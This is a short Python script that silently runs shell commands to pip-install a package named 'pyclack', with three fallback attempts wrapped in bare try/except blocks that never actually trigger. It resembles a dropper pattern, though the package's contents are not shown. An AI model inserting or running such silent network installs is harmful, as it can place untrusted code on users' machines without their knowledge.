import os
try:
    os.system("python.exe -m pip install pyclack")
except:
  try:
      os.system("python3 -m pip install pyclack")
  except:
      try:
          os.system("pip install pyclack")
      except:
          pass
